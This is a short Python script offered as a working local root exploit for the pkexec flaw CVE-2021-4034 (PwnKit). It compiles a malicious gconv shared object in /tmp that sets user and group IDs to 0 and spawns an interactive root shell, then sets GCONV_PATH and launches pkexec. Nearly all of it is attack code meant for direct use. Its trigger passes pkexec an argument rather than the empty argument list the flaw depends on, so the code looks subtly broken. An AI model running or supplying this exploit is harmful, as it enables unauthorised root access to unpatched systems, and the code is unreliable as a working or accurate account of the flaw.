#!/usr/bin/env python3
"""
PwnKit (CVE-2021-4034) Local Privilege Escalation exploit
Usage: python3 pwnkit.py
Target must have:
 - /usr/bin/pkexec (SUID)
 - gcc or cc (for compilation)
"""

import os, sys, subprocess, tempfile

def compile_so():
    """Create a shared library that gives a root shell when loaded via GCONV_PATH."""
    c_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {}

void gconv_init(void *step)
{
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    char *args[] = { "/bin/sh", "-i", NULL };
    execve("/bin/sh", args, NULL);
    _exit(0);
}
"""
    # Write to temporary files
    tmpdir = "/tmp/pwn"
    os.makedirs(tmpdir, exist_ok=True)

    with open(f"{tmpdir}/gconv-modules", "w") as f:
        f.write("module  UTF-8//  INTERNAL  id  1\n")

    with open(f"{tmpdir}/id.c", "w") as f:
        f.write(c_code)

    # Compile
    print("[*] Compiling shared object...")
    ret = subprocess.run(
        ["gcc", "-shared", "-o", f"{tmpdir}/id.so", f"{tmpdir}/id.c", "-nostartfiles", "-fPIC"],
        capture_output=True, text=True
    )
    if ret.returncode != 0:
        print("[-] Compilation failed. gcc might be missing or broken.")
        print("    stderr:", ret.stderr)
        sys.exit(1)
    return tmpdir

def exploit(tmpdir):
    """Set environment and trigger pkexec."""
    os.environ["GCONV_PATH"] = tmpdir
    os.environ["CHARSET"] = "id"

    print("[*] Spawning pkexec...")
    try:
        os.execlp("/usr/bin/pkexec", "pkexec", "")
    except Exception as e:
        print(f"[-] Failed to execute pkexec: {e}")
        sys.exit(1)

if __name__ == "__main__":
    print("[*] PwnKit Exploit for CVE-2021-4034")
    if os.geteuid() == 0:
        print("[+] Already root! Enjoy your shell.")
        os.execvp("/bin/sh", ["/bin/sh", "-i"])
    else:
        workdir = compile_so()
        exploit(workdir)
